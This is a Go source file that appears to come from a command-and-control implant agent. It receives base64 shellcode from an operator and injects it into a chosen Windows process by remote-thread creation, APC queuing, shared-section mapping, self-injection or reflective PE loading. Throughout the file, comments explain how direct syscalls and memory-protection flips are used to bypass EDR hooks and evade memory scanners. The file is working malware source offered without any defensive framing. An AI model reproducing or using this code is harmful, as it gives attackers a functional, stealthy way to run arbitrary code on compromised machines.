//go:build windows
// +build windows

package handlers

// HandleInject injects base64-encoded shellcode into a target process,
// or reflectively loads a full PE image.
//
// Payload fields:
//   pid      int     — target process PID (0 = self-inject via NtCreateThread)
//   data     string  — base64-encoded shellcode or PE blob
//   method   string  — "createthread" (default) | "apc" | "mapsection" | "self" | "reflectload"

import (
	"context"
	"encoding/base64"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"overlord-client/cmd/agent/evasion"
	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleInject(ctx context.Context, env *agentRuntime.Env, cmdID string, payload map[string]interface{}) error {
	b64, _ := payload["data"].(string)
	if b64 == "" {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: false, Message: "missing data",
		})
	}
	sc, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: false,
			Message: fmt.Sprintf("base64 decode: %v", err),
		})
	}

	pidFloat, _ := payload["pid"].(float64)
	pid := uint32(pidFloat)
	method, _ := payload["method"].(string)
	if method == "" {
		method = "createthread"
	}

	var injectErr error
	switch method {
	case "self":
		injectErr = injectSelf(sc)
	case "apc":
		injectErr = injectAPC(sc, pid)
	case "mapsection":
		injectErr = injectMapSection(sc, pid)
	case "reflectload":
		injectErr = evasion.ReflectiveLoad(sc)
	default:
		injectErr = injectCreateThread(sc, pid)
	}

	if injectErr != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type: "command_result", CommandID: cmdID, OK: false,
			Message: fmt.Sprintf("inject(%s) pid=%d: %v", method, pid, injectErr),
		})
	}
	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type: "command_result", CommandID: cmdID, OK: true,
		Message: fmt.Sprintf("injected %d bytes via %s into pid %d", len(sc), method, pid),
	})
}

// injectCreateThread allocates memory in the target process, writes shellcode,
// then flips the page to RX before starting the thread.  RW→RX flip avoids
// an RWX private allocation that memory scanners (Moneta, pe-sieve, CS) alarm on.
// All NT operations use direct syscall stubs (bypasses EDR hooks).
func injectCreateThread(sc []byte, pid uint32) error {
	proc, err := openTargetProcess(pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(proc)

	addr := evasion.NtAllocateVirtualMemory(uintptr(proc), uintptr(len(sc)), windows.PAGE_READWRITE)
	if addr == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed")
	}
	if !evasion.NtWriteRemote(uintptr(proc), addr, sc) {
		return fmt.Errorf("NtWriteRemote failed")
	}
	// Flip to RX — no executable allocation while writing.
	if !evasion.NtProtectRemote(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ) {
		return fmt.Errorf("NtProtectRemote failed")
	}
	th := evasion.NtCreateThreadEx(uintptr(proc), addr)
	if th == 0 {
		return fmt.Errorf("NtCreateThreadEx failed")
	}
	windows.CloseHandle(windows.Handle(th))
	return nil
}

// injectAPC allocates RW memory, writes shellcode, flips to RX, then queues an
// APC to every thread of the target process via direct NtQueueApcThread syscall
// stubs.  Thread enumeration uses NtGetNextThread (no Toolhelp32 snapshot).
// At least one thread must be in an alertable wait state for the APC to fire.
func injectAPC(sc []byte, pid uint32) error {
	proc, err := openTargetProcess(pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(proc)

	addr := evasion.NtAllocateVirtualMemory(uintptr(proc), uintptr(len(sc)), windows.PAGE_READWRITE)
	if addr == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed")
	}
	if !evasion.NtWriteRemote(uintptr(proc), addr, sc) {
		return fmt.Errorf("NtWriteRemote failed")
	}
	if !evasion.NtProtectRemote(uintptr(proc), addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ) {
		return fmt.Errorf("NtProtectRemote failed")
	}

	// Enumerate threads via NtGetNextThread — no kernel32 Toolhelp32 snapshot.
	const threadSetContext = 0x0010
	queued := 0
	var th uintptr
	for {
		next := evasion.NtGetNextThread(uintptr(proc), th, threadSetContext)
		if th != 0 {
			windows.CloseHandle(windows.Handle(th))
		}
		if next == 0 {
			break
		}
		th = next
		evasion.NtQueueApcThread(th, addr, 0)
		queued++
	}
	if queued == 0 {
		return fmt.Errorf("no threads accessible in pid %d", pid)
	}
	return nil
}

// injectMapSection injects shellcode by creating a shared memory section and
// mapping RW into our process to write, then RX into the target.  This avoids
// any NtWriteVirtualMemory or NtAllocateVirtualMemory call in the target — the
// only NT events visible to the target are MapViewOfSection and CreateThread.
func injectMapSection(sc []byte, pid uint32) error {
	if len(sc) == 0 {
		return fmt.Errorf("empty shellcode")
	}
	proc, err := openTargetProcess(pid)
	if err != nil {
		return err
	}
	defer windows.CloseHandle(proc)

	// Create a pagefile-backed section; max protection must cover both views.
	hSection := evasion.NtCreateSection(uint64(len(sc)), windows.PAGE_EXECUTE_READWRITE)
	if hSection == 0 {
		return fmt.Errorf("NtCreateSection failed")
	}
	defer windows.CloseHandle(windows.Handle(hSection))

	// Map RW into our process — write shellcode here (not visible in target).
	const selfProc = ^uintptr(0)
	var localBase uintptr
	localSize := uintptr(len(sc))
	if !evasion.NtMapViewOfSection(hSection, selfProc, &localBase, &localSize, windows.PAGE_READWRITE) {
		return fmt.Errorf("NtMapViewOfSection (local) failed")
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(localBase)), len(sc))
	copy(dst, sc)
	evasion.NtUnmapViewOfSection(selfProc, localBase)

	// Map RX into target — no WriteVirtualMemory event in target's address space.
	var remoteBase uintptr
	remoteSize := uintptr(len(sc))
	if !evasion.NtMapViewOfSection(hSection, uintptr(proc), &remoteBase, &remoteSize, windows.PAGE_EXECUTE_READ) {
		return fmt.Errorf("NtMapViewOfSection (remote) failed")
	}

	th := evasion.NtCreateThreadEx(uintptr(proc), remoteBase)
	if th == 0 {
		return fmt.Errorf("NtCreateThreadEx failed")
	}
	windows.CloseHandle(windows.Handle(th))
	return nil
}

// injectSelf allocates RWX memory in the current process and executes the
// shellcode on a new thread. Used for testing / local execution.
func injectSelf(sc []byte) error {
	const selfProc = ^uintptr(0) // (HANDLE)-1
	mem := evasion.NtAllocateVirtualMemory(selfProc, uintptr(len(sc)), windows.PAGE_EXECUTE_READWRITE)
	if mem == 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed")
	}
	dst := unsafe.Slice((*byte)(unsafe.Pointer(mem)), len(sc))
	copy(dst, sc)

	th := evasion.NtCreateThreadEx(selfProc, mem)
	if th == 0 {
		return fmt.Errorf("NtCreateThreadEx (self) failed")
	}
	windows.CloseHandle(windows.Handle(th))
	return nil
}

// openTargetProcess opens the process with necessary rights.
// If pid == 0, opens the current process.
func openTargetProcess(pid uint32) (windows.Handle, error) {
	if pid == 0 {
		return windows.GetCurrentProcess()
	}
	return windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|
			windows.PROCESS_VM_WRITE|windows.PROCESS_QUERY_INFORMATION,
		false, pid,
	)
}
